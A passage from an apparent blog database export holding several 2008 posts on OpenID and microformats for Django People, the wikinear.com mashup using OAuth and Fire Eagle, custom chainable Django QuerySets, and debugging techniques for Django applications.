&lt;p&gt;So, I spent a few hours this evening integrating my current development version of &lt;a href=&quot;http://code.google.com/p/django-openid/&quot;&gt;django-openid&lt;/a&gt;, which thankfully had about 80% of the code needed to integrate with Django's built-in authentication mechanism already written. Sadly the other 20% is either incomplete or a bit of a mess, but I've checked it in to &lt;a href=&quot;http://django-openid.googlecode.com/svn/branches/auth-integration/&quot;&gt;a branch on Google Code&lt;/a&gt; for anyone who's interested.&lt;/p&gt;

&lt;p&gt;Anyway, there are a few new features on the site of interest to OpenID users:&lt;/p&gt;

&lt;ol&gt;
    &lt;li&gt;When &lt;a href=&quot;http://djangopeople.net/signup/&quot;&gt;signing up for a new account&lt;/a&gt;, you now have the option to start by signing in with an OpenID. If you do this, you'll be able to complete the signup form without having to pick a password. If your OpenID provider supports simple registration the name, e-mail address and username fields will be filled in for you.&lt;/li&gt;
    &lt;li&gt;If you already have an existing account, you can &lt;a href=&quot;http://djangopeople.net/openid/associations/&quot;&gt;associate one or more OpenIDs&lt;/a&gt; with that account. You'll then be able to use any of them to sign in to the account. Why multiple OpenIDs instead of just one? Two reasons: firstly, it opens the potential for doing interesting things with multiple OpenIDs from different providers in the future; secondly, it gives you a fallback for if one of your OpenID providers becomes unavailable.&lt;/li&gt;
    &lt;li&gt;You can freely add and remove OpenIDs from your associations, with one exception: the site won't let you delete your last OpenID if your account doesn't also have a password associated with it, to prevent you from locking yourself out.&lt;/li&gt;
    &lt;li&gt;While I decided that I didn't want Django People to become &lt;em&gt;yet another&lt;/em&gt; OpenID provider, I do want to give people the ability to use their profile page on the site as an OpenID - so that they can prove that they own it (see my &lt;a href=&quot;http://simonwillison.net/2008/Jan/7/projection/&quot; title=&quot;Yahoo!, Flickr, OpenID and Identity Projection&quot;&gt;recent post on identity projection&lt;/a&gt;). To that end, the new account settings page lets advanced OpenID users set up an &lt;code&gt;openid.server&lt;/code&gt; and &lt;code&gt;openid.delegate&lt;/code&gt; for their profile page, as described in &lt;a href=&quot;http://simonwillison.net/2006/Dec/19/openid/&quot; title=&quot;How to turn your blog in to an OpenID&quot;&gt;my blog entry&lt;/a&gt; from just over a year ago.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;One caveat: the site only supports OpenID 1.1, at least for the moment. I had originally planned to go for OpenID 2.0, but demand was such that I decided to get what I had up and running rather than digging in to the OpenID 2.0 libraries.&lt;/p&gt;

&lt;h3&gt;Microformats&lt;/h3&gt;

&lt;p&gt;While I was messing around with OpenID, &lt;a href=&quot;http://notes.natbat.net/&quot;&gt;Natalie&lt;/a&gt; was updating the site's templates to clean up the crufty code I'd introduced and add some microformatted goodness. The site now uses &lt;a href=&quot;http://microformats.org/wiki/hcard&quot;&gt;hCard&lt;/a&gt; where you would expect it (country listing pages, skill listing pages and the &lt;a href=&quot;http://djangopeople.net/search/&quot;&gt;new search interface&lt;/a&gt;) and the profile pages have been updated with a healthy dose of &lt;a href=&quot;http://microformats.org/wiki/xfn&quot;&gt;XFN&lt;/a&gt; (just rel=&quot;me&quot;, since there isn't a relevant microformat for &quot;people who live nearby&quot;) and &lt;a href=&quot;http://microformats.org/wiki/rel-tag&quot;&gt;Rel-Tag&lt;/a&gt;. On &lt;a href=&quot;http://adactio.com/&quot;&gt;Jeremy Keith&lt;/a&gt;'s suggestion, the profile pages also use &lt;a href=&quot;http://microformats.org/wiki/hresume&quot;&gt;hResume&lt;/a&gt; - all the more reason to add the Django projects you've worked on to your profile's portfolio.&lt;/p&gt;

&lt;p&gt;As usual, post feedback and bug reports as comments on this entry.&lt;/p&gt;</field>
		<field name="created">2008-01-24 02:02:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1575</field>
		<field name="title">wikinear.com, OAuth and Fire Eagle</field>
		<field name="slug">wikinear</field>
		<field name="body">&lt;p&gt;I'm pleased to announce &lt;a href=&quot;http://wikinear.com/&quot;&gt;wikinear.com&lt;/a&gt;. It's a simple site that does just one thing: show you a list of the five Wikipedia pages that are geographically closest to your current location. It's designed (or not-designed) to be used mainly from mobile phones.&lt;/p&gt;

&lt;p&gt;You'll need a &lt;a href=&quot;http://fireeagle.yahoo.net/&quot;&gt;Fire Eagle&lt;/a&gt; invitation code to use the site. &lt;del&gt;I've got four spare; the first four comments to ask for one can have them&lt;/del&gt; my invites are all accounted for. If you don't have a Fire Eagle account you'll have to make do with &lt;a href=&quot;http://www.flickr.com/photos/simon/2351435457/&quot;&gt;this screenshot&lt;/a&gt; instead.&lt;/p&gt;

&lt;p&gt;The idea for the site came from living in Oxford for a year. The city is full of beautiful old historic buildings (many of them colleges), but very few of them are labelled or signposted. With wikinear.com and a GPS hooked up to Fire Eagle, I can pull out my phone and see a list of the closest points of interest, plotted on a handy map.&lt;/p&gt;

&lt;p&gt;Under the hood the site combines a number of interesting technologies: &lt;a href=&quot;http://oauth.net/&quot;&gt;OAuth&lt;/a&gt;, &lt;a href=&quot;http://fireeagle.yahoo.net/&quot;&gt;Fire Eagle&lt;/a&gt;, &lt;a href=&quot;http://www.geonames.org/&quot;&gt;GeoNames&lt;/a&gt; and the new &lt;a href=&quot;http://code.google.com/apis/maps/documentation/staticmaps/&quot;&gt;Google Static Maps API&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;OAuth&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://oauth.net/&quot;&gt;OAuth&lt;/a&gt; was originally designed to solve a problem with OpenID: in an authentication protocol based on browser redirects, how do you authenticate a desktop or command-line application? As it turned out, the solution to that problem solved a bunch of other problems that are unrelated to OpenID, so OAuth now exists as very much its own thing. In essence, it lets users delegate permission to perform actions on their behalf, without having to hand their regular authentication credentials (e.g. username and password) over to a third-party piece of software.&lt;/p&gt;

&lt;p&gt;If you've ever used a Flickr application that sends you back to Flickr to ask permission to view your private photos you'll understand what OAuth does straight away. Before OAuth, sites had to invent their own solutions to this problem - complete with smart security measures, their own UI flow and libraries for developers wishing to access their protected APIs. OAuth provides a ready-made solution, complete with &lt;a href=&quot;http://oauth.net/code/&quot;&gt;tested libraries in a bunch of languages&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you want to securely expose your user's private data via an API, OAuth is a no-brainer. I expect to see a lot more of it over the next year.&lt;/p&gt;

&lt;h3&gt;Fire Eagle&lt;/h3&gt;

&lt;p&gt;Launched at ETech a few weeks ago, &lt;a href=&quot;http://fireeagle.yahoo.net/&quot;&gt;Fire Eagle&lt;/a&gt; is a service with enormous potential. You can watch Tom Coates explain it in ten minutes in &lt;a href=&quot;http://developer.yahoo.net/blogs/theater/archives/2008/03/fire_eagle_launches.html&quot; title=&quot;Fire Eagle Launches&quot;&gt;this video from the conference&lt;/a&gt;, but the short version is that Fire Eagle acts as a &lt;em&gt;location broker&lt;/em&gt;. It consists of two key OAuth-protected APIs: one for setting the geographical location of a user, and another for retrieving that location.&lt;/p&gt;

&lt;p&gt;This leads to a neat separation of concerns. On the one hand are the applications that attempt to figure out your location - GPS receivers, WiFi maps, mobile phones that triangulate nearby cell towers, or even sites that know where you are because you told them (Dopplr and Upcoming, for example, or the Fire Eagle site itself). On the other hand are the applications that do something useful with your location - from restaurant review sites, traffic alert services, friend finders and &lt;a href=&quot;http://en.wikipedia.org/wiki/Alternate_reality_game&quot;&gt;ARGs&lt;/a&gt; down to trivial applications like wikinear.com.&lt;/p&gt;

&lt;p&gt;As a developer, this is really exciting. I can build location-based services without having to solve the much bigger problem of figuring out where my users are. Even better, wikinear.com becomes incrementally more useful every time someone builds a new tool for passing location information to Fire Eagle, without me having to do anything at all.&lt;/p&gt;

&lt;p&gt;Obviously privacy is a huge concern when dealing with this kind of data. That's where the Fire Eagle application itself comes in: it provides a simple suite of tools for users to manage the applications that can access their location. Applications can be permitted to access different levels of accuracy or disabled entirely, and there's a &quot;Hide&quot; button for disabling all applications at once.&lt;/p&gt;

&lt;p&gt;Disclaimer: I worked on an early prototype of Fire Eagle as my last project at Yahoo! before leaving in January 2007, but the product that has launched has changed enormously and is entirely the work of the current Fire Eagle team. wikinear.com is inspired by part of that early prototype.&lt;/p&gt;

&lt;h3&gt;Wikipedia and GeoNames&lt;/h3&gt;

&lt;p&gt;Wikipedia has a thriving community of geo-hackers, mainly focused around the &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:WikiProject_Maps&quot;&gt;Maps&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:WikiProject_Geographical_coordinates&quot;&gt;Geographical coordinates&lt;/a&gt; and &lt;a href=&quot;http://de.wikipedia.org/wiki/Wikipedia:WikiProjekt_Georeferenzierung/Wikipedia-World/en&quot;&gt;Wikipedia-World&lt;/a&gt; wiki projects. Many Wikipedia pages (&lt;a href=&quot;http://en.wikipedia.org/wiki/Brighton&quot;&gt;Brighton&lt;/a&gt;, for example) have their co-ordinates in the top-right, added using a bewildering array of macros and markup extensions. You can browse through the huge collection of geotagged pages using &lt;a href=&quot;http://maps.google.com/maps?q=http:%2F%2Ftools.wikimedia.de%2F~kolossos%2Fgeoworld%2FWP-world-maps.php%3Flang%3Den&amp;amp;ie=UTF8&amp;amp;om=1&quot;&gt;this KML-powered Google Maps tool&lt;/a&gt; - zoom in and wait a few seconds to load in more markers.&lt;/p&gt;

&lt;p&gt;The wonderful &lt;a href=&quot;http://www.geonames.org/&quot;&gt;GeoNames&lt;/a&gt; (also used on &lt;a href=&quot;http://djangopeople.net/&quot;&gt;djangopeople.net&lt;/a&gt;) includes &lt;a href=&quot;http://www.geonames.org/wikipedia.html&quot;&gt;an API for querying Wikipedia by location&lt;/a&gt;, based on 610,000 articles extracted from a Wikipedia data dump. This was a huge relief when I found it, as &quot;order by distance from X&quot; is actually pretty tricky to do efficiently; I've used expanding bounding box searches in the past but I'd love to hear about more effective solutions.&lt;/p&gt;

&lt;h3&gt;Google Static Maps&lt;/h3&gt;

&lt;p&gt;A long-term criticism of the Google Maps API is that it requires JavaScript to display anything at all - once you've committed to using it, you're going to have trouble implementing unobtrusive scripting (although you can &lt;a href=&quot;http://24ways.org/2007/unobtrusively-mapping-microformats-with-jquery&quot; title=&quot;Unobtrusively Mapping Microformats with jQuery&quot;&gt;work around the problem&lt;/a&gt; to some extent). Yahoo! Maps has long been better in this regard, but their &lt;a href=&quot;http://developer.yahoo.com/maps/rest/V1/mapImage.html&quot;&gt;map image API&lt;/a&gt; is a bit of a pain to use - you have to do an initial call to get back the URL to an image embedded in an XML file, then extract that URL and send it to the browser.&lt;/p&gt;

&lt;p&gt;Launched &lt;a href=&quot;http://googlemapsapi.blogspot.com/2008/02/google-maps-without-scripting.html&quot; title=&quot;Google Maps Without the Scripting&quot;&gt;last month&lt;/a&gt;, Google's &lt;a href=&quot;http://code.google.com/apis/maps/documentation/staticmaps/&quot;&gt;Static Maps API&lt;/a&gt; is a big improvement. As with &lt;a href=&quot;http://code.google.com/apis/chart/&quot;&gt;Google Charts&lt;/a&gt;, you need only construct a URL to the image to have it dynamically generated on the fly. You can also specify markers, and optionally omit the initial latitude/longitude/zoom to indicate that you want a best fit for the markers you are displaying. There's even a flag for a &quot;mobile optimised&quot; image which I'm using for wikinear.com.&lt;/p&gt;

&lt;h3&gt;Mixing it all together&lt;/h3&gt;

&lt;p&gt;Excluding templates, the entire application comes in at less than 200 lines of code and took around two hours to build. The only persistence is a couple of cookies for storing Fire Eagle tokens; Django's database layer isn't even configured (and user locations aren't logged anywhere, which is great from a privacy point of view). I suppose it's a classic mashup - Fire Eagle + OAuth + Wikipedia + GeoNames + Google Static Maps = wikinear.com. Despite its simplicity (or maybe because if it), I think it's a neat demonstration of the kind of applications Fire Eagle enables.&lt;/p&gt;</field>
		<field name="created">2008-03-22 14:34:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1576</field>
		<field name="title">jQuery style chaining with the Django ORM</field>
		<field name="slug">orm</field>
		<field name="body">&lt;p&gt;Django's ORM is, in my opinion, the unsung gem of the framework. For the subset of SQL that's used in most web applications it's very hard to beat. It's a beautiful piece of API design, and I tip my hat to the people who designed and built it.&lt;/p&gt;

&lt;h4&gt;Lazy evaluation&lt;/h4&gt;

&lt;p&gt;If you haven't spent much time with the ORM, two key features are lazy evaluation and chaining. Consider the following statement:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;entries = Entry.objects.all()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assuming you have created an Entry model of some sort, the above statement will create a Django QuerySet object representing all of the entries in the database. It will &lt;em&gt;not&lt;/em&gt; result in the execution of any SQL - QuerySets are lazily evaluated, and are only executed at the last possible moment. The most common situation in which SQL will be executed is when the object is used for iteration:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;for entry in entries:
    print entry.title&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This usually happens in a template:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;lt;ul&amp;gt;
{% for entry in entries %}
  &amp;lt;li&amp;gt;{{ entry.title }}&amp;lt;/li&amp;gt;
{% endfor %}
&amp;lt;/ul&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lazy evaluation works nicely with  &lt;a href=&quot;http://www.djangoproject.com/documentation/cache/#template-fragment-caching&quot;&gt;template fragment caching&lt;/a&gt; - even if you pass a QuerySet to a template it won't be executed if the fragment it is used in can be served from the cache.&lt;/p&gt;

&lt;p&gt;You can modify QuerySets as many times as you like before they are executed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;entries = Entry.objects.all()
today = datetime.date.today()
entries_this_year = entries.filter(
    posted__year = today.year
)
entries_last_year = entries.filter(
    posted__year = today.year - 1
)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, no SQL has been executed, but we now have two QuerySets which, when iterated, will produce the desired result.&lt;/p&gt;

&lt;h4&gt;Chaining&lt;/h4&gt;

&lt;p&gt;Chaining comes in when you want to apply multiple modifications to a QuerySet. Here are blog entries from 2006 that weren't posted in January:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;Entry.objects.filter(
    posted__year = 2006
).exclude(posted__month = 1)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And here's entries from that year posted to the category named &quot;Personal&quot;, ordered by title:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;Entry.objects.filter(
    posted__year = 2006
).filter(
    category__name = &quot;Personal&quot;
).order_by('title')&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above can also be expressed like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;Entry.objects.filter(
    posted__year = 2006,
    category__name = &quot;Personal&quot;
).order_by('title')&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;Chaining in jQuery&lt;/h4&gt;

&lt;p&gt;The parallels to &lt;a href=&quot;http://jquery.com/&quot;&gt;jQuery&lt;/a&gt; are pretty clear. The jQuery API is built around chaining, and the jQuery &lt;a href=&quot;http://docs.jquery.com/Effects&quot;&gt;animation library&lt;/a&gt; even uses a form of lazy evaluation to automatically queue up effects to run in sequence:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('div#message').addClass(
	'borderfade'
).animate({
   'borderWidth': '+10px'
}, 1000).fadeOut();&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the neatest things about jQuery is the plugin model, which takes advantage of JavaScript's prototype inheritance and makes it trivially easy to add new chainable methods. If we wanted to package the above dumb effect up as a plugin, we could do so like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery.fn.dumbBorderFade = function() {
    return this.addClass(
        'borderfade'
    ).animate({
       'borderWidth': '+10px'
    }, 1000).fadeOut();
};&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can apply it to an element like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('div#message').dumbBorderFade();&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;Custom QuerySet methods in Django&lt;/h4&gt;

&lt;p&gt;Django supports adding custom methods for accessing the ORM through the ability to implement a custom &lt;a href=&quot;http://www.djangoproject.com/documentation/model-api/#managers&quot;&gt;Manager&lt;/a&gt;. In the above examples, &lt;code class=&quot;python&quot;&gt;Entry.objects&lt;/code&gt; is the Manager. The downside of this approach is that methods added to a manager can only be used at the beginning of the chain.&lt;/p&gt;

&lt;p&gt;Luckily, Managers also provide a hook for returning a custom QuerySet. This means we can create our own QuerySet subclass and add new methods to it, in a way that's reminiscent of jQuery:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from django.db import models
from django.db.models.query import QuerySet
import datetime

class EntryQuerySet(QuerySet):
    def on_date(self, date):
        next = date + datetime.timedelta(days = 1)
        return self.filter(
            posted__gt = date,
            posted__lt = next
        )

class EntryManager(models.Manager):
    def get_query_set(self):
        return EntryQuerySet(self.model)

class Entry(models.Model):
    ...
    objects = EntryManager()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above gives us a new method on the QuerySets returned by Entry.objects called on_date(), which lets us filter entries down to those posted on a specific date. Now we can run queries like the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;Entry.objects.filter(
    category__name = 'Personal'
).on_date(datetime.date(2008, 5, 1))&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;Reducing the boilerplate&lt;/h4&gt;

&lt;p&gt;This method works fine, but it requires quite a bit of boilerplate code - a QuerySet subclass and a Manager subclass plus the wiring to pull them all together. Wouldn't it be neat if you could declare the extra QuerySet methods inside the model definition itself?&lt;/p&gt;

&lt;p&gt;It turns out you can, and it's surprisingly easy. Here's the syntax I came up with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from django.db.models.query import QuerySet

class Entry(models.Model):
   ...
   objects = QuerySetManager()
   ...
   class QuerySet(QuerySet):
       def on_date(self, date):
           return self.filter(
               ...
           )&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here I've made the custom QuerySet class an inner class of the model definition. I've also replaced the default manager with a QuerySetManager. All this class does is return the QuerySet inner class for the current model from get_query_set. The implementation looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;class QuerySetManager(models.Manager):
    def get_query_set(self):
        return self.model.QuerySet(self.model)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I'm pretty happy with this; it makes it trivial to add custom QuerySet methods and does so without any monkeypatching or deep reliance on Django ORM internals. I think the ease with which this can be achieved is a testament to the quality of the ORM API.&lt;/p&gt;</field>
		<field name="created">2008-05-01 12:31:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1577</field>
		<field name="title">Debugging Django</field>
		<field name="slug">debugging</field>
		<field name="body">&lt;p&gt;I gave a talk on Debugging Django applications at &lt;a href=&quot;http://upcoming.yahoo.com/event/546918/&quot;&gt;Monday's inaugural meeting&lt;/a&gt; of DJUGL, the London Django Users Group. I wanted to talk about something that wasn't particularly well documented elsewhere, so I pitched the talk as &quot;Bug Driven Development&quot; - what happens when Test Driven Development goes the way of &lt;a href=&quot;http://www.shipmentoffail.com/fails/2008/04/horse-vs-car-fail/&quot;&gt;this unfortunate pony&lt;/a&gt;.&lt;/p&gt;

The slides &lt;a href=&quot;http://www.slideshare.net/simon/debugging-django/&quot;&gt;are up on SlideShare&lt;/a&gt;, but don't provide quite enough context so I'm going to cover the tips in full here.

&lt;h4&gt;Making the most of the error page&lt;/h4&gt;

&lt;p&gt;Django's default error page is great - it provides a detailed traceback with local variables, lets you expand out the lines of code around the problem, provides a plain text exception suitable for e-mailing to colleagues and even a one-click button to send details to &lt;a href=&quot;http://dpaste.com/&quot;&gt;http://dpaste.com/&lt;/a&gt; so you can go and talk about the error on IRC. It also serves the same purpose as &lt;a href=&quot;http://www.php.net/phpinfo&quot;&gt;phpinfo()&lt;/a&gt; - it shows you your application's settings, the GET, POST and COOKIE data from the request and the all important META fields assembled from the HTTP environment (great for remembering how to miss-spell HTTP_REFERER).&lt;/p&gt;

&lt;p&gt;Useful tip number one is that you can trigger the error page from any view just by adding the following line:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;assert False&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can serve up an expression with the assertion as well; it will be displayed at the top of the error page:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;assert False, request.GET&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One particularly useful place to use this is when you are building a complex form. If you want to see the data that was submitted, drop an assert False in to the view that the form targets and use the error page to inspect the data.&lt;/p&gt;

&lt;h4&gt;Logging to the development server console&lt;/h4&gt;

&lt;p&gt;If you want to know what's going on inside a view, the quickest way is to drop in a print statement. The development server outputs any print statements directly to the terminal; it's the server-side alternative to a JavaScript alert().&lt;/p&gt;

&lt;p&gt;If you want to be a bit more sophisticated with your logging, it's worth turning to Python's logging module (part of the standard library). You can configure it in your settings.py:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import logging
logging.basicConfig(
    level = logging.DEBUG,
    format = '%(asctime)s %(levelname)s %(message)s',
)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then call it from any of your views:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def my_view(request):
    import logging
    logging.debug(&quot;A log message&quot;)
    ...&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, this will log things to the terminal where the development server is running. If you want to log things to a file you can do so by extending the basicConfig call:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;logging.basicConfig(
    level = logging.DEBUG,
    format = '%(asctime)s %(levelname)s %(message)s',
    filename = '/tmp/myapp.log',
    filemode = 'w'
)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can then use &lt;samp&gt;tail -f /tmp/myapp.log&lt;/samp&gt; to see log lines being appended to that file in real-time. This can be used in production as well as development.&lt;/p&gt;

&lt;p&gt;The above just scratches the surface of Python's logging module; with a bit of &lt;a href=&quot;http://docs.python.org/lib/module-logging.html&quot; title=&quot;Loggingi facility for Python&quot;&gt;digging around in the documentation&lt;/a&gt; you can use it to rotate log files, send log messages over the network and even POST log events to an HTTP server somewhere.&lt;/p&gt;

&lt;p&gt;Often you find yourself dealing with an error that only occurs in certain circumstances - a function might be called from dozens of different places in your program but only runs in to trouble in a very specific case. You can use the &lt;a href=&quot;http://docs.python.org/lib/module-traceback.html&quot;&gt;traceback module&lt;/a&gt; to log the current stack, which will allow you to tell how a function was called when something went wrong:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import logging, traceback, pprint

def my_buggy_function(arg):
    ...
    if error_condition:
        stack = pprint.pformat(traceback.extract_stack())
        logging.debug('An error occurred: %s' % stack)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The tuple returned by &lt;code class=&quot;python&quot;&gt;traceback.extract_stack()&lt;/code&gt; includes line numbers, function names and paths to Python files so you can use it to reconstruct a good amount of information about your program.&lt;/p&gt;

&lt;h4&gt;Using the debugger&lt;/h4&gt;

&lt;p&gt;By far the most powerful weapon in my debugging toolkit is the Python debugger, &lt;a href=&quot;http://docs.python.org/lib/module-pdb.html&quot;&gt;pdb&lt;/a&gt;. Again, this ships with the standard library so there's nothing extra to install. pdb is a command line debugger (if you want a GUI options include &lt;a href=&quot;http://sourceforge.net/projects/pyeclipse/&quot;&gt;PyEclipse&lt;/a&gt; and &lt;a href=&quot;http://www.activestate.com/Products/komodo_ide/index.mhtml&quot;&gt;Komodo&lt;/a&gt;, but I haven't used either myself). There are a bunch of ways to activate pdb, but the most straight forward is to simply drop the following line directly in to a Django view function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import pdb; pdb.set_trace()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you try to load that page in your browser, the browser will hang - the page will appear to be loading extremely slowly. What's actually happened is the developer server has paused execution and thrown up the pdb interface - you can switch over to your console and start interacting directly with the server mid view.&lt;/p&gt;

&lt;p&gt;Did I mention you should never, ever leave this on in production?&lt;/p&gt;

&lt;p&gt;So, you've got a hung development server and a pdb prompt. What can you do with it? The answer is pretty much anything. I won't provide a full pdb tutorial here (&lt;a href=&quot;http://www.onlamp.com/pub/a/python/2005/09/01/debugger.html&quot;&gt;this is a good introduction&lt;/a&gt;), but the commands I find most useful are the following:&lt;/p&gt;

&lt;dl&gt;
    &lt;dt&gt;list&lt;/dt&gt;
    &lt;dd&gt;Shows the lines of source code around your current point of execution. You can run it multiple times to increase the amount of source code displayed.&lt;/dd&gt;
    &lt;dt&gt;n&lt;/dt&gt;
    &lt;dd&gt;Execute the next line&lt;/dd&gt;
    &lt;dt&gt;s&lt;/dt&gt;
    &lt;dd&gt;Same as n, but steps in to any functions that are called. You can quickly get lost in a twisty maze of code with this command, but that's OK because...&lt;/dd&gt;
    &lt;dt&gt;r&lt;/dt&gt;
    &lt;dd&gt;Continues execution until the current function returns&lt;/dd&gt;
    &lt;dt&gt;u&lt;/dt&gt;
    &lt;dd&gt;Goes UP one level in the stack - so you can see the function that called the function you are currently in&lt;/dd&gt;
    &lt;dt&gt;d&lt;/dt&gt;
    &lt;dd&gt;Goes DOWN again&lt;/dd&gt;
    &lt;dt&gt;locals()&lt;/dt&gt;
    &lt;dd&gt;not a pdb command, but handy for seeing what's in your current scope&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;The pdb docs have &lt;a href=&quot;http://www.python.org/doc/current/lib/debugger-commands.html&quot;&gt;a full list of commands&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The pdb prompt doubles up as a full Python interactive shell, so you can not only access variables but you can modify them, call functions and generally mess around with the internals of your application as much as you like, while it's running. It's kind of a poor man's imitation of being a Smalltalk developer.&lt;/p&gt;

&lt;p&gt;Remember though, the whole time you're messing around in pdb your browser is still stuck there, waiting for the HTTP request to come back. If you hit &quot;c&quot; (for continue) your application will kick in again, the request will be served and your browser will breathe a sigh of relief.&lt;/p&gt;

&lt;p&gt;Thankfully you don't have to use pdb in a way that freezes your development server; it also works great in the interactive shell. If you've got a buggy function, one way to explore it is to run it interactively, then use the following idiom:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; def function_that_raises_an_exception():
...   assert False
... 
&amp;gt;&amp;gt;&amp;gt; function_that_raises_an_exception()
Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 2, in function_that_raises_an_exception
AssertionError
&amp;gt;&amp;gt;&amp;gt; import pdb; pdb.pm()
&amp;gt; &amp;lt;stdin&amp;gt;(2)function_that_raises_an_exception()
(Pdb)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;pdb.pm()&lt;/code&gt; stands for post-mortem, and is probably my favourite feature of the debugger - it lets you jump back in to debug the most recently raised exception, even if you hadn't imported pdb at the time the exception was raised.&lt;/p&gt;

&lt;p&gt;One last pdb tip: you can use it to debug Python command line scripts such as Django's custom &lt;samp&gt;./manage.py&lt;/samp&gt; commands. The trick is to run the script like this:&lt;/p&gt;

&lt;p&gt;&lt;samp&gt;python -i manage.py buggy_command&lt;/samp&gt;&lt;/p&gt;

&lt;p&gt;The &lt;samp&gt;-i&lt;/samp&gt; argument causes Python to drop in to the interactive prompt after executing the script. If the script raised an exception, you can then use &lt;code&gt;pdb.pm()&lt;/code&gt; to debug it.&lt;/p&gt;

&lt;h4&gt;Handling errors in production&lt;/h4&gt;

&lt;p&gt;Django's default behaviour in production (that is, when the DEBUG setting is set to False) is to e-mail exception reports to anyone listed in the ADMINS section. You can also turn on e-mail reports on every 404 error with the SEND_BROKEN_LINK_EMAILS setting, which will send them to addresses in the MANAGERS setting. As far as I know these settings don't do anything else - they're a pretty ancient bit of Django.&lt;/p&gt;

&lt;p&gt;On a high traffic site you probably don't want to be e-mailed on every server error. One neat alternative is David Cramer's &lt;a href=&quot;http://code.google.com/p/django-db-log/&quot;&gt;django-db-log&lt;/a&gt;, which logs exceptions to a database table. It cleverly uses an MD5 hash of the traceback to aggregate many reports of the same error. More importantly though, it acts as a really straight forward example of how to use Django middleware's process_exception hook to roll your own error reporting. Take a look &lt;a href=&quot;http://code.google.com/p/django-db-log/source/browse/trunk/djangodblog/__init__.py&quot;&gt;at the code&lt;/a&gt; to see how simple this is.&lt;/p&gt;

&lt;h4&gt;More useful middleware&lt;/h4&gt;

&lt;p&gt;In the talk I demoed a couple of other handy pieces of middleware. The first was the &lt;a href=&quot;http://www.djangosnippets.org/snippets/727/&quot;&gt;ProfilerMiddleware&lt;/a&gt; (one of several profiling tools on &lt;a href=&quot;http://www.djangosnippets.org/&quot;&gt;Django Snippets&lt;/a&gt;) which allows you to add &lt;samp&gt;?prof&lt;/samp&gt; to the end of any URL to see the output of Python's &lt;a href=&quot;http://docs.python.org/lib/module-profile.html&quot;&gt;cProfile module&lt;/a&gt; run against that request. The second is one that I've just released: &lt;a href=&quot;http://www.djangosnippets.org/snippets/766/&quot;&gt;DebugFooter&lt;/a&gt;, which adds a footer showing exactly which templates were loaded from where (handy for debugging complex template paths) as well as every executed SQL query and how long each one took.&lt;/p&gt;

&lt;h4&gt;Abusing the test client&lt;/h4&gt;

